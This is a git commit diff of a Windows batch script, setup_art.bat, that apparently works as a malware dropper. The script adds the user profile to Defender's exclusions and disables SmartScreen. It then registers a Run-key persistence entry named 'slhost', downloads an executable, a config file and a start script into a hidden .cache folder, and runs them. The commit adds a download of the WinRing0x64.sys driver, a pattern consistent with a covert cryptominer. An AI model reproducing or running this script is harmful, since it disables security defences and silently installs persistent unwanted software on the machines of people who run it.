74715ac6dbb0aaf9ad90c0f10df352e3ebb23f1c
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2024-01-15 05:22:53 -0300

    Update setup_art.bat

--- setup_art.bat
+++ setup_art.bat
@@ -1,12 +1,13 @@
 @echo off
-powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  
 
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f
+powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')"
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/art.json','%USERPROFILE%\.cache\services\slhost\config.json')"
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')"
+powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/WinRing0x64.sys','%USERPROFILE%\.cache\services\slhost\WinRing0x64.sys')"
 
 %USERPROFILE%\.cache\services\slhost\Noise.bat
